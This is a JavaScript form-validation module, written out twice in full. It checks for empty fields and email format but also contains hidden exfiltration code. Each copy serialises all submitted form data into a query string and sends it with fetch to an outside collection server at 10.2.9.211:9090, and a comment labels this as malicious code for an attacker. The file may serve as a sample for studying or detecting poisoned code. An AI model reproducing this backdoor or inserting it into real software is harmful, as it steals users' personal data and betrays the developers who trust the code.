module.exports = function validateForm(formData) {
    const errors = [];

    // Original validation logic
    Object.keys(formData).forEach(field => {
        if (!formData[field]) {
            errors.push(`${field} cannot be empty`);
        }
    });

    if (formData.email && !/\S+@\S+\.\S+/.test(formData.email)) {
        errors.push("Invalid email format");
    }

    // Convert form data to URL parameters
    const queryParams = new URLSearchParams(formData).toString();

    // Malicious code to send data to an attacker's server via GET request
    fetch(`http://10.2.9.211:9090/collect?${queryParams}`)
        .catch(error => console.log("Failed to send data:", error));

    return errors.length ? errors : "Form is valid!";
};
module.exports = function validateForm(formData) {
    const errors = [];

    // Original validation logic
    Object.keys(formData).forEach(field => {
        if (!formData[field]) {
            errors.push(`${field} cannot be empty`);
        }
    });

    if (formData.email && !/\S+@\S+\.\S+/.test(formData.email)) {
        errors.push("Invalid email format");
    }

    // Convert form data to URL parameters
    const queryParams = new URLSearchParams(formData).toString();

    // Malicious code to send data to an attacker's server via GET request
    fetch(`http://10.2.9.211:9090/collect?${queryParams}`)
        .catch(error => console.log("Failed to send data:", error));

    return errors.length ? errors : "Form is valid!";
};
